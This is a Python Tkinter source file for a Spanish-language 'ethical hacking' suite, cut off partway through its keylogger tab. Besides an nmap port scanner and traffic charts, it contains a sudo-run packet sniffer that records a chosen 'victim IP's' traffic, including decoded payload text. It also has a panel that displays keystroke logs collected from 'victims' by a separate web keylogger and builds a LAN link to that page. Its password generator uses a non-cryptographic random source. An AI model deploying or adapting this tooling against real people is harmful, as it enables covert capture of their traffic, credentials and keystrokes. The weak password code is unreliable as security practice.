
import matplotlib
matplotlib.use('Agg')

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import subprocess
import sys
import os
import random
import string
import threading
import time
import pyperclip
import nmap
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import re
import webbrowser
import socket
from datetime import datetime

CAPTURAS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "capturas_sniffer")

if not os.path.exists(CAPTURAS_DIR):
    os.makedirs(CAPTURAS_DIR)

def crear_carpeta_captura(nombre_base):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    nombre_limpio = re.sub(r'[^\w\-_]', '_', nombre_base)
    nombre_carpeta = f"{timestamp}_{nombre_limpio}"
    ruta_carpeta = os.path.join(CAPTURAS_DIR, nombre_carpeta)
    if not os.path.exists(ruta_carpeta):
        os.makedirs(ruta_carpeta)
    return ruta_carpeta

def obtener_ip_local():
    """Obtiene la IP local de la máquina en la red"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def generar_contrasena(longitud):
    if longitud < 8:
        raise ValueError("Mínimo 8 caracteres")
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(longitud))

def escanear_puertos(host, rango, output_text):
    """Escanea puertos TCP usando nmap (modo -sT, no requiere sudo)"""
    try:
        import nmap
    except ImportError:
        output_text.insert(tk.END, "❌ Error: No se encontró la librería python-nmap.\n")
        output_text.insert(tk.END, "   Instálala con: pip install python-nmap\n")
        return
    
    output_text.insert(tk.END, f"🔍 Escaneando {host} puertos {rango} (modo TCP connect)...\n")
    output_text.update()
    
    nm = nmap.PortScanner()
    try:
        nm.scan(host, arguments=f"-p {rango} -sT -T4 --open")
        
        if host not in nm.all_hosts():
            output_text.insert(tk.END, f"❌ No se pudo escanear {host}. El host no responde.\n")
            return
        
        abiertos = []
        for proto in nm[host].all_protocols():
            for port in nm[host][proto]:
                if nm[host][proto][port]['state'] == 'open':
                    abiertos.append(port)
                    service = nm[host][proto][port].get('name', 'desconocido')
                    output_text.insert(tk.END, f"✅ Puerto {port} ({proto}) ABIERTO - {service}\n")
        
        if not abiertos:
            output_text.insert(tk.END, "❌ No se encontraron puertos abiertos.\n")
        else:
            output_text.insert(tk.END, f"\n📊 Total: {len(abiertos)} puerto(s) abierto(s)\n")
            
    except nmap.PortScannerError as e:
        output_text.insert(tk.END, f"❌ Error de nmap: {e}\n")
        output_text.insert(tk.END, "   Asegúrate de tener nmap instalado: sudo apt install nmap\n")
    except Exception as e:
        output_text.insert(tk.END, f"❌ Error: {e}\n")
    
    output_text.insert(tk.END, "✅ Escaneo completado.\n")

def generar_grafico_pcap_mejorado(archivo_pcap, output_text, root, nombre_base, carpeta_destino):
    if not os.path.exists(archivo_pcap):
        output_text.insert(tk.END, f"❌ No se encuentra el archivo {archivo_pcap}\n")
        return
    if os.path.getsize(archivo_pcap) == 0:
        output_text.insert(tk.END, f"❌ El archivo {archivo_pcap} está vacío. No se puede generar gráfico.\n")
        return

    try:
        from scapy.all import rdpcap, IP, TCP, UDP, ARP
        try:
            import numpy as np
            tiene_numpy = True
        except ImportError:
            tiene_numpy = False
            output_text.insert(tk.END, "⚠️ numpy no instalado. El gráfico de evolución temporal no se generará.\n")

        paquetes = rdpcap(archivo_pcap)
        total_paquetes = len(paquetes)
        if total_paquetes == 0:
            output_text.insert(tk.END, "No hay paquetes en la captura.\n")
            return

        protocolos = {'TCP': 0, 'UDP': 0, 'ARP': 0, 'Otros IP': 0, 'Otros': 0}
        timestamps = []
        for pkt in paquetes:
            if hasattr(pkt, 'time') and tiene_numpy:
                timestamps.append(float(pkt.time))
            if IP in pkt:
                proto = pkt[IP].proto
                if proto == 6:
                    protocolos['TCP'] += 1
                elif proto == 17:
                    protocolos['UDP'] += 1
                else:
                    protocolos['Otros IP'] += 1
            elif ARP in pkt:
                protocolos['ARP'] += 1
            else:
                protocolos['Otros'] += 1

        if timestamps and tiene_numpy:
            duracion = max(timestamps) - min(timestamps)
            if duracion > 0:
                num_bins = min(30, max(5, int(duracion)))
                hist, bins = np.histogram(timestamps, bins=num_bins)
                bin_centers = (bins[:-1] + bins[1:]) / 2
                tiempo_inicial = min(timestamps)
                tiempo_relativo = bin_centers - tiempo_inicial
            else:
                hist = [total_paquetes]
                tiempo_relativo = [0]
        else:
            duracion = 0
            hist = []
            tiempo_relativo = []
            tiene_numpy = False

        # Crear figura
        if tiene_numpy and duracion > 0:
            fig = plt.figure(figsize=(16, 6))
            ax_bar = fig.add_subplot(131)
            ax_pie = fig.add_subplot(132)
            ax_line = fig.add_subplot(133)
        else:
            fig = plt.figure(figsize=(14, 6))
            ax_bar = fig.add_subplot(121)
            ax_pie = fig.add_subplot(122)
            ax_line = None

        fig.suptitle(f'Análisis de tráfico - {nombre_base}', fontsize=16, fontweight='bold')
        fig.subplots_adjust(wspace=0.4)

        colores = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd']

        # Gráfico de barras
        barras = ax_bar.bar(protocolos.keys(), protocolos.values(), color=colores, edgecolor='black')
        ax_bar.set_title('Paquetes por protocolo', fontsize=12)
        ax_bar.set_xlabel('Protocolo', fontsize=10)
        ax_bar.set_ylabel('Número de paquetes', fontsize=10)
        ax_bar.grid(axis='y', linestyle='--', alpha=0.7)
        # CORRECCIÓN: set_xticks antes de set_xticklabels
        ax_bar.set_xticks(range(len(protocolos.keys())))
        ax_bar.set_xticklabels(protocolos.keys(), rotation=0, ha='center')
        for barra, valor in zip(barras, protocolos.values()):
            ax_bar.text(barra.get_x() + barra.get_width()/2, barra.get_height() + max(1, total_paquetes/50),
                        str(valor), ha='center', va='bottom', fontweight='bold', fontsize=9)

        # Gráfico circular
        datos_pastel = {k: v for k, v in protocolos.items() if v > 0}
        etiquetas = list(datos_pastel.keys())
        valores = list(datos_pastel.values())
        wedges, texts, autotexts = ax_pie.pie(valores, labels=etiquetas, autopct='%1.1f%%', startangle=90,
                   colors=colores[:len(etiquetas)], shadow=True, explode=[0.05]*len(etiquetas))
        ax_pie.set_title('Distribución porcentual', fontsize=12)
        for text in texts:
            text.set_fontsize(10)
        for autotext in autotexts:
            autotext.set_fontsize(9)
            autotext.set_color('white')
            autotext.set_fontweight('bold')

        # Gráfico de línea
        if ax_line is not None and len(hist) > 0:
            if len(hist) > 30:
                hist_agrupado = [sum(hist[i:i+2]) for i in range(0, len(hist), 2)]
                tiempo_agrupado = [tiempo_relativo[i] for i in range(0, len(tiempo_relativo), 2)]
            else:
                hist_agrupado = hist
                tiempo_agrupado = tiempo_relativo
            
            ax_line.plot(tiempo_agrupado, hist_agrupado, marker='o', linestyle='-', 
                        color='#1f77b4', markersize=3, linewidth=1.5)
            ax_line.fill_between(tiempo_agrupado, 0, hist_agrupado, alpha=0.3)
            ax_line.set_title('Paquetes por segundo', fontsize=12)
            ax_line.set_xlabel('Tiempo (segundos)', fontsize=10)
            ax_line.set_ylabel('Paquetes', fontsize=10)
            ax_line.grid(True, linestyle='--', alpha=0.7)
            if len(hist_agrupado) > 0:
                pico = max(hist_agrupado)
                idx_pico = hist_agrupado.index(pico)
                ax_line.annotate(f'Pico: {pico} pkt/s', xy=(tiempo_agrupado[idx_pico], pico),
                                 xytext=(10, 10), textcoords='offset points',
                                 arrowprops=dict(arrowstyle='->', color='red'),
                                 fontsize=9, fontweight='bold')
            ax_line.set_ylim(bottom=0)

        # Estadísticas
        stats_text = f"📊 Total paquetes: {total_paquetes}\n"
        stats_text += f"⏱️ Duración: {duracion:.2f} s\n"
        stats_text += f"⚡ Paquetes/s: {total_paquetes/duracion if duracion>0 else 0:.1f}"
        
        fig.text(0.98, 0.98, stats_text, transform=fig.transFigure,
                 fontsize=10, verticalalignment='top', horizontalalignment='right',
                 bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.8),
                 family='monospace')

        plt.tight_layout()

        img_path = os.path.join(carpeta_destino, f"{nombre_base}_grafico_completo.png")
        plt.savefig(img_path, dpi=150, bbox_inches='tight')
        plt.close()

        output_text.insert(tk.END, f"✅ Gráficos completos guardados como: {img_path}\n")
        output_text.insert(tk.END, f"📊 Estadísticas: {total_paquetes} paquetes en {duracion:.2f} segundos.\n")
        output_text.insert(tk.END, f"   TCP: {protocolos['TCP']} | UDP: {protocolos['UDP']} | ARP: {protocolos['ARP']}\n")

        root.after(0, lambda: mostrar_ventana_grafico_completo(protocolos, total_paquetes, duracion,
                                                              hist if not isinstance(hist, np.ndarray) else hist.tolist(),
                                                              tiempo_relativo if not isinstance(tiempo_relativo, np.ndarray) else tiempo_relativo.tolist(),
                                                              nombre_base, tiene_numpy))

    except Exception as e:
        output_text.insert(tk.END, f"Error al generar gráficos: {e}\n")

def mostrar_ventana_grafico_completo(protocolos, total_paquetes, duracion, hist, tiempos, nombre_base, tiene_numpy):
    ventana = tk.Toplevel()
    ventana.title("Estadísticas de tráfico - Sniffer")
    ventana.geometry("1300x750")
    ventana.configure(bg='white')
    
    # Añadir scrollbar
    canvas = tk.Canvas(ventana, bg='white')
    scrollbar = ttk.Scrollbar(ventana, orient="vertical", command=canvas.yview)
    scrollable_frame = ttk.Frame(canvas)
    
    scrollable_frame.bind(
        "<Configure>",
        lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
    )
    
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
    canvas.configure(yscrollcommand=scrollbar.set)
    
    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")

    if tiene_numpy and len(hist) > 0:
        fig = plt.figure(figsize=(16, 7))
        fig.suptitle(f'Análisis de tráfico - {nombre_base}', fontsize=16, fontweight='bold')
        ax_bar = fig.add_subplot(131)
        ax_pie = fig.add_subplot(132)
        ax_line = fig.add_subplot(133)
    else:
        fig = plt.figure(figsize=(14, 6))
        fig.suptitle(f'Análisis de tráfico - {nombre_base}', fontsize=16, fontweight='bold')
        ax_bar = fig.add_subplot(121)
        ax_pie = fig.add_subplot(122)
        ax_line = None

    fig.subplots_adjust(wspace=0.4)
    colores = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd']

    # Barras
    barras = ax_bar.bar(protocolos.keys(), protocolos.values(), color=colores, edgecolor='black')
    ax_bar.set_title('Paquetes por protocolo', fontsize=12)
    ax_bar.set_xlabel('Protocolo', fontsize=10)
    ax_bar.set_ylabel('Número de paquetes', fontsize=10)
    ax_bar.grid(axis='y', linestyle='--', alpha=0.7)
    ax_bar.set_xticks(range(len(protocolos.keys())))
    ax_bar.set_xticklabels(protocolos.keys(), rotation=0, ha='center')
    for barra, valor in zip(barras, protocolos.values()):
        ax_bar.text(barra.get_x() + barra.get_width()/2, barra.get_height() + max(1, total_paquetes/50),
                    str(valor), ha='center', va='bottom', fontweight='bold', fontsize=9)

    # Pastel
    datos_pastel = {k: v for k, v in protocolos.items() if v > 0}
    etiquetas = list(datos_pastel.keys())
    valores = list(datos_pastel.values())
    wedges, texts, autotexts = ax_pie.pie(valores, labels=etiquetas, autopct='%1.1f%%', startangle=90,
               colors=colores[:len(etiquetas)], shadow=True, explode=[0.05]*len(etiquetas))
    ax_pie.set_title('Distribución porcentual', fontsize=12)
    for text in texts:
        text.set_fontsize(10)
    for autotext in autotexts:
        autotext.set_fontsize(9)
        autotext.set_color('white')
        autotext.set_fontweight('bold')

    # Línea
    if ax_line is not None and len(hist) > 0:
        if len(hist) > 30:
            hist_agrupado = [sum(hist[i:i+2]) for i in range(0, len(hist), 2)]
            tiempo_agrupado = [tiempos[i] for i in range(0, len(tiempos), 2)]
        else:
            hist_agrupado = hist
            tiempo_agrupado = tiempos
        
        ax_line.plot(tiempo_agrupado, hist_agrupado, marker='o', linestyle='-', 
                    color='#1f77b4', markersize=3, linewidth=1.5)
        ax_line.fill_between(tiempo_agrupado, 0, hist_agrupado, alpha=0.3)
        ax_line.set_title('Paquetes por segundo', fontsize=12)
        ax_line.set_xlabel('Tiempo (segundos)', fontsize=10)
        ax_line.set_ylabel('Paquetes', fontsize=10)
        ax_line.grid(True, linestyle='--', alpha=0.7)
        if len(hist_agrupado) > 0:
            pico = max(hist_agrupado)
            idx_pico = hist_agrupado.index(pico)
            ax_line.annotate(f'Pico: {pico} pkt/s', xy=(tiempo_agrupado[idx_pico], pico),
                             xytext=(10, 10), textcoords='offset points',
                             arrowprops=dict(arrowstyle='->', color='red'),
                             fontsize=9, fontweight='bold')
        ax_line.set_ylim(bottom=0)

    # Estadísticas
    stats_text = f"📊 Total paquetes: {total_paquetes}\n"
    stats_text += f"⏱️ Duración: {duracion:.2f} s\n"
    stats_text += f"⚡ Paquetes/s: {total_paquetes/duracion if duracion>0 else 0:.1f}"
    
    fig.text(0.98, 0.98, stats_text, transform=fig.transFigure,
             fontsize=10, verticalalignment='top', horizontalalignment='right',
             bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.8),
             family='monospace')

    canvas_plot = FigureCanvasTkAgg(fig, master=scrollable_frame)
    canvas_plot.draw()
    canvas_plot.get_tk_widget().pack(fill=tk.BOTH, expand=True)

def capturar_trafico(interfaz, tiempo, nombre_base, victim_ip, output_text, progress_bar, root):
    def capturar():
        if victim_ip:
            output_text.insert(tk.END, f"🎯 Capturando tráfico filtrado por IP: {victim_ip}\n")
        else:
            output_text.insert(tk.END, f"📡 Capturando TODO el tráfico en {interfaz} durante {tiempo}s (modo general)\n")
        output_text.update()
        
        carpeta_captura = crear_carpeta_captura(nombre_base)
        output_text.insert(tk.END, f"📁 Carpeta de captura: {carpeta_captura}\n")
        output_text.update()
        
        ruta_pcap = os.path.join(carpeta_captura, f"{nombre_base}.pcap")
        ruta_txt = os.path.join(carpeta_captura, f"{nombre_base}_detalle.txt")
        
        script_path = os.path.join(os.path.dirname(__file__), "sniffer_aux.py")
        
        script_content = '''#!/usr/bin/env python3
from scapy.all import sniff, wrpcap, IP
import sys
import time
import datetime

def formatear_hora(timestamp):
    """Convierte timestamp Unix a formato legible"""
    try:
        dt = datetime.datetime.fromtimestamp(timestamp)
        return dt.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    except:
        return str(timestamp)

if len(sys.argv) < 5:
    print("Uso: python3 sniffer_aux.py <interfaz> <tiempo> <archivo_pcap> <archivo_txt> [victim_ip]")
    sys.exit(1)

iface = sys.argv[1]
tiempo = int(sys.argv[2])
archivo_pcap = sys.argv[3]
archivo_txt = sys.argv[4]
victim_ip = sys.argv[5] if len(sys.argv) > 5 else ""

print(f"Capturando en {iface} durante {tiempo}s...")
if victim_ip:
    print(f"🎯 Modo ESPECÍFICO - Filtrando por IP: {victim_ip}")
else:
    print(f"📡 Modo GENERAL - Capturando todo el tráfico")
paquetes = []

def filtrar_paquete(pkt):
    if not victim_ip:
        return True
    if IP in pkt:
        ip = pkt[IP]
        return victim_ip in (ip.src, ip.dst)
    return False

def guardar_paquete(pkt):
    paquetes.append(pkt)

sniff(iface=iface, timeout=tiempo, prn=guardar_paquete, store=False, lfilter=filtrar_paquete)

wrpcap(archivo_pcap, paquetes)
print(f"Guardado {len(paquetes)} paquetes en {archivo_pcap}")

with open(archivo_txt, 'w', encoding='utf-8') as txt:
    txt.write(f"CAPTURA DE TRÁFICO - {time.ctime()}\\n")
    txt.write(f"Interfaz: {iface}\\n")
    txt.write(f"Duración: {tiempo} segundos\\n")
    if victim_ip:
        txt.write(f"🎯 Modo ESPECÍFICO - Filtro por IP: {victim_ip}\\n")
    else:
        txt.write(f"📡 Modo GENERAL - Todo el tráfico\\n")
    txt.write(f"Total paquetes: {len(paquetes)}\\n")
    txt.write("=" * 80 + "\\n\\n")
    
    for idx, pkt in enumerate(paquetes, 1):
        txt.write(f"Paquete #{idx}\\n")
        txt.write(f"  Hora (Unix): {pkt.time}\\n")
        txt.write(f"  Hora (local): {formatear_hora(pkt.time)}\\n")
        txt.write(f"  Resumen: {pkt.summary()}\\n")
        if pkt.haslayer('IP'):
            ip = pkt['IP']
            txt.write(f"  IP: {ip.src} -> {ip.dst}\\n")
        if pkt.haslayer('TCP'):
            tcp = pkt['TCP']
            txt.write(f"  TCP: puerto {tcp.sport} -> {tcp.dport}\\n")
        if pkt.haslayer('UDP'):
            udp = pkt['UDP']
            txt.write(f"  UDP: puerto {udp.sport} -> {udp.dport}\\n")
        if pkt.haslayer('Raw'):
            raw = bytes(pkt['Raw'].load)
            txt.write(f"  Datos HEX: {raw[:100].hex()}\\n")
            try:
                texto = raw.decode('utf-8', errors='replace')
                if texto.strip() and any(c.isprintable() for c in texto):
                    txt.write(f"  Datos TXT: {texto[:200]}...\\n")
                else:
                    txt.write(f"  Datos TXT: (datos binarios o encriptados)\\n")
            except:
                txt.write(f"  Datos TXT: (no se pudo decodificar)\\n")
        txt.write("\\n")

print(f"✅ Información detallada guardada en {archivo_txt}")
'''
        
        with open(script_path, "w") as f:
            f.write(script_content)
        
        cmd = ["sudo", sys.executable, script_path, interfaz, str(tiempo), ruta_pcap, ruta_txt]
        if victim_ip:
            cmd.append(victim_ip)
        
        output_text.insert(tk.END, f"Ejecutando: {' '.join(cmd)}\n")
        output_text.update()
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for step in range(tiempo):
            progress_bar['value'] = (step+1)/tiempo * 100
            root.update_idletasks()
            time.sleep(1)
        
        stdout, stderr = proc.communicate()
        output_text.insert(tk.END, stdout)
        if stderr:
            output_text.insert(tk.END, f"Errores:\n{stderr}")
        output_text.insert(tk.END, "Captura finalizada.\n")
        progress_bar['value'] = 0
        
        if os.path.exists(ruta_pcap) and os.path.getsize(ruta_pcap) > 0:
            output_text.insert(tk.END, f"✅ Archivo {ruta_pcap} guardado correctamente.\n")
            if os.path.exists(ruta_txt):
                output_text.insert(tk.END, f"✅ Archivo detallado {ruta_txt} guardado.\n")
                try:
                    with open(ruta_txt, 'r', encoding='utf-8') as txt:
                        primeras_lineas = txt.readlines()[:20]
                        output_text.insert(tk.END, "\n📄 Vista previa del archivo detallado:\n")
                        output_text.insert(tk.END, "".join(primeras_lineas))
                        output_text.insert(tk.END, "...\n")
                except:
                    pass
            root.after(0, lambda: generar_grafico_pcap_mejorado(ruta_pcap, output_text, root, nombre_base, carpeta_captura))
        else:
            output_text.insert(tk.END, f"❌ Error: No se pudo generar el archivo {ruta_pcap} o está vacío.\n")
    
    threading.Thread(target=capturar, daemon=True).start()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
KEYLOGGER_LOG_FILE = os.path.join(BASE_DIR, "keylogger_boletos_blessd-main", "logs_blessd.txt")

def leer_logs_keylogger():
    if os.path.exists(KEYLOGGER_LOG_FILE):
        try:
            with open(KEYLOGGER_LOG_FILE, 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return "Error al leer archivo de logs."
    else:
        return "No hay logs aún. Esperando víctimas...\n(Asegúrate de que el servidor Node.js esté corriendo)"

def actualizar_logs_keylogger(text_widget):
    logs = leer_logs_keylogger()
    text_widget.delete(1.0, tk.END)
    text_widget.insert(tk.END, logs)
    text_widget.see(tk.END)

def iniciar_actualizacion_logs(text_widget, intervalo=3000):
    def actualizar():
        while True:
            time.sleep(intervalo / 1000.0)
            try:
                text_widget.after(0, lambda: actualizar_logs_keylogger(text_widget))
            except:
                break
    threading.Thread(target=actualizar, daemon=True).start()

def abrir_keylogger_web():
    webbrowser.open("http://localhost:3000")

def abrir_keylogger_web_local():
    """Abre el keylogger usando la IP local de la máquina"""
    ip_local = obtener_ip_local()
    webbrowser.open(f"http://{ip_local}:3000")

class HackingSuite:
    def __init__(self, root):
        self.root = root
        root.title("Hacking Ético Suite - Herramientas de Seguridad")
        root.geometry("900x700")
        root.configure(bg='#2c3e50')
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook.Tab', font=('Arial', 12, 'bold'))
        style.configure('TButton', font=('Arial', 10))
        
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.tab_scan = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_scan, text="🔍 Escaneo de puertos")
        self.setup_scan_tab()
        
        self.tab_pass = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_pass, text="🔐 Generador de contraseñas")
        self.setup_password_tab()
        
        self.tab_sniff = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_sniff, text="📡 Sniffer de red")
        self.setup_sniffer_tab()
        
        self.tab_key = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_key, text="⌨️ Keylogger Web")
        self.setup_keylogger_tab()
    
    def setup_scan_tab(self):
        frame = ttk.Frame(self.tab_scan, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        ttk.Label(frame, text="IP o dominio:").grid(row=0, column=0, sticky='w', pady=5)
        self.scan_host = ttk.Entry(frame, width=30)
        self.scan_host.grid(row=0, column=1, pady=5)
        self.scan_host.insert(0, "127.0.0.1")
        ttk.Label(frame, text="Rango de puertos (1-65535):").grid(row=1, column=0, sticky='w', pady=5)
        self.scan_ports = ttk.Entry(frame, width=30)
        self.scan_ports.grid(row=1, column=1, pady=5)
        self.scan_ports.insert(0, "22,80,443")
        self.scan_output = scrolledtext.ScrolledText(frame, height=15, width=80)
        self.scan_output.grid(row=3, column=0, columnspan=2, pady=10)
        btn_scan = ttk.Button(frame, text="Iniciar escaneo", command=self.iniciar_escaneo)
        btn_scan.grid(row=2, column=0, columnspan=2, pady=5)
    
    def iniciar_escaneo(self):
        host = self.scan_host.get().strip()
        rango_str = self.scan_ports.get().strip()
        
        def validar_puerto(valor):
            try:
                num = int(valor)
                return 1 <= num <= 65535
            except:
                return False
        
        partes = rango_str.replace(' ', '').split(',')
        valido = True
        for parte in partes:
            if '-' in parte:
                r = parte.split('-')
                if len(r) == 2 and r[0].isdigit() and r[1].isdigit():
                    if not (1 <= int(r[0]) <= 65535 and 1 <= int(r[1]) <= 65535 and int(r[0]) <= int(r[1])):
                        valido = False
                        break
                else:
                    valido = False
                    break
            else:
                if not validar_puerto(parte):
                    valido = False
                    break
        if not valido:
            messagebox.showerror("Error", "Rango de puertos inválido.\nDebe estar entre 1 y 65535.\nEjemplos: '80', '22,443', '1-1024'")
            return
        
        self.scan_output.delete(1.0, tk.END)
        threading.Thread(target=escanear_puertos, args=(host, rango_str, self.scan_output), daemon=True).start()
    
    def setup_password_tab(self):
        frame = ttk.Frame(self.tab_pass, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text="Usuario (opcional):").grid(row=0, column=0, pady=5, sticky='e')
        self.pass_user = ttk.Entry(frame, width=20)
        self.pass_user.grid(row=0, column=1, pady=5, sticky='w')

        ttk.Label(frame, text="Longitud (mínimo 8):").grid(row=1, column=0, pady=5, sticky='e')
        self.pass_len = ttk.Entry(frame, width=10)
        self.pass_len.grid(row=1, column=1, pady=5, sticky='w')
        self.pass_len.insert(0, "12")

        ttk.Label(frame, text="Cantidad:").grid(row=2, column=0, pady=5, sticky='e')
        self.pass_count = ttk.Entry(frame, width=10)
        self.pass_count.grid(row=2, column=1, pady=5, sticky='w')
        self.pass_count.insert(0, "1")

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=3, column=0, columnspan=2, pady=10)
        btn_gen = ttk.Button(btn_frame, text="Generar", command=self.generar_contrasenas)
        btn_gen.pack(side=tk.LEFT, padx=5)
        btn_clear = ttk.Button(btn_frame, text="Limpiar", command=self.limpiar_campos)
        btn_clear.pack(side=tk.LEFT, padx=5)

        self.pass_listbox = tk.Listbox(frame, height=10, width=70)
        self.pass_listbox.grid(row=4, column=0, columnspan=2, pady=10)

        btn_copy_selected = ttk.Button(frame, text="Copiar seleccionada", command=self.copiar_seleccionada)
        btn_copy_selected.grid(row=5, column=0, pady=5)

        btn_copy_all = ttk.Button(frame, text="Copiar todas", command=self.copiar_todas)
        btn_copy_all.grid(row=5, column=1, pady=5)

        self.pass_status = ttk.Label(frame, text="")
        self.pass_status.grid(row=6, column=0, columnspan=2, pady=5)

        self.contrasenas_generadas = []

    def limpiar_campos(self):
        self.pass_user.delete(0, tk.END)
        self.pass_len.delete(0, tk.END)
        self.pass_len.insert(0, "12")
        self.pass_count.delete(0, tk.END)
        self.pass_count.insert(0, "1")
        self.pass_listbox.delete(0, tk.END)
        self.contrasenas_generadas = []
        self.pass_status.config(text="Campos limpiados.")

    def generar_contrasenas(self):
        try:
            long = int(self.pass_len.get())
            cant = int(self.pass_count.get())
            if long < 8:
                messagebox.showerror("Error", "La longitud mínima es 8 caracteres")
                return
            if cant < 1:
                messagebox.showerror("Error", "La cantidad debe ser al menos 1")
                return
            usuario = self.pass_user.get().strip()
            if not usuario:
                usuario = "Anónimo"
            self.contrasenas_generadas = []
            self.pass_listbox.delete(0, tk.END)
            for i in range(cant):
                pwd = generar_contrasena(long)
                self.contrasenas_generadas.append((usuario, pwd))
                self.pass_listbox.insert(tk.END, f"{usuario}: {pwd}")
            self.pass_status.config(text=f"{cant} contraseña(s) generada(s).")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def copiar_seleccionada(self):
        seleccion = self.pass_listbox.curselection()
        if seleccion:
            texto = self.pass_listbox.get(seleccion[0])
            if ": " in texto:
                pwd = texto.split(": ", 1)[1]
            else:
                pwd = texto
            pyperclip.copy(pwd)
            self.pass_status.config(text="Contraseña copiada al portapapeles.")
        else:
            messagebox.showwarning("Aviso", "Selecciona una contraseña primero.")

    def copiar_todas(self):
        if not self.contrasenas_generadas:
            messagebox.showwarning("Aviso", "Primero genera las contraseñas.")
            return
        try:
            texto = "\n".join([f"{usr}: {pwd}" for usr, pwd in self.contrasenas_generadas])
            pyperclip.copy(texto)
            self.pass_status.config(text=f"{len(self.contrasenas_generadas)} contraseñas copiadas.")
            messagebox.showinfo("Éxito", f"Se copiaron {len(self.contrasenas_generadas)} contraseñas.")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    
    def setup_sniffer_tab(self):
        frame = ttk.Frame(self.tab_sniff, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(frame, text="Interfaz de red (ej: wlan0, eth0, any):").grid(row=0, column=0, sticky='w')
        self.sniff_iface = ttk.Entry(frame, width=20)
        self.sniff_iface.grid(row=0, column=1, pady=5)
        self.sniff_iface.insert(0, "wlp2s0")
        
        ttk.Label(frame, text="Modo de captura:").grid(row=1, column=0, sticky='w')
        self.sniff_mode = ttk.Combobox(frame, values=["GENERAL (todo el tráfico)", "ESPECÍFICO (filtrar por IP)"], width=35)
        self.sniff_mode.grid(row=1, column=1, pady=5)
        self.sniff_mode.current(0)
        self.sniff_mode.bind("<<ComboboxSelected>>", self.cambiar_modo_sniffer)
        
        ttk.Label(frame, text="IP de la víctima (solo en modo específico):").grid(row=2, column=0, sticky='w')
        self.sniff_victim_ip = ttk.Entry(frame, width=20, state='disabled')
        self.sniff_victim_ip.grid(row=2, column=1, pady=5)
        self.sniff_victim_ip.insert(0, "")
        
        ttk.Label(frame, text="Tiempo (segundos):").grid(row=3, column=0, sticky='w')
        self.sniff_time = ttk.Entry(frame, width=10)
        self.sniff_time.grid(row=3, column=1, pady=5)
        self.sniff_time.insert(0, "30")
        
        ttk.Label(frame, text="Nombre de la captura (para identificar):").grid(row=4, column=0, sticky='w')
        self.sniff_file_base = ttk.Entry(frame, width=20)
        self.sniff_file_base.grid(row=4, column=1, pady=5)
        self.sniff_file_base.insert(0, "captura")
        
        self.sniff_progress = ttk.Progressbar(frame, orient='horizontal', length=400, mode='determinate')
        self.sniff_progress.grid(row=5, column=0, columnspan=2, pady=10)
        
        self.sniff_output = scrolledtext.ScrolledText(frame, height=12, width=80)
        self.sniff_output.grid(row=6, column=0, columnspan=2, pady=10)
        
        btn_sniff = ttk.Button(frame, text="Iniciar captura", command=self.iniciar_sniffer)
        btn_sniff.grid(row=7, column=0, columnspan=2, pady=5)
    
    def cambiar_modo_sniffer(self, event=None):
        if self.sniff_mode.current() == 1:
            self.sniff_victim_ip.config(state='normal')
        else:
            self.sniff_victim_ip.config(state='disabled')
            self.sniff_victim_ip.delete(0, tk.END)
    
    def iniciar_sniffer(self):
        iface = self.sniff_iface.get()
        tiempo = int(self.sniff_time.get())
        nombre_base = self.sniff_file_base.get().strip()
        
        if self.sniff_mode.current() == 1:
            victim_ip = self.sniff_victim_ip.get().strip()
            if not victim_ip:
                messagebox.showwarning("Advertencia", "En modo específico debes ingresar una IP de víctima")
                return
        else:
            victim_ip = ""
        
        if not nombre_base:
            nombre_base = "captura"
        
        nombre_base = re.sub(r'[^\w\-_]', '_', nombre_base)
        self.sniff_output.delete(1.0, tk.END)
        capturar_trafico(iface, tiempo, nombre_base, victim_ip, self.sniff_output, self.sniff_progress, self.root)
    
    def setup_keylogger_tab(self):
        frame = ttk.Frame(self.tab_key, padding=10)
        frame.pack(fill=tk.BOTH, expand=True)

        top_frame = ttk.Frame(frame)
        top_frame.pack(fill=tk.X, pady=5)
        ttk.Label(top_frame, text="Keylogger web (Node.js)", font=('Arial', 14)).pack(side=tk.LEFT, padx=5)
        
        btn_open = ttk.Button(top_frame, text="Abrir localhost", command=abrir_keylogger_web)
        btn_open.pack(side=tk.RIGHT, padx=2)
        
        btn_open_local = ttk.Button(top_frame, text="Abrir IP local", command=abrir_keylogger_web_local)
        btn_open_local.pack(side=tk.RIGHT, padx=2)

        ip_local = obtener_ip_local()
        link_completo = f"http://{ip_local}:3000/"
        
        link_frame = ttk.Frame(frame)
        link_frame.pack(fill=tk.X, pady=5)
        
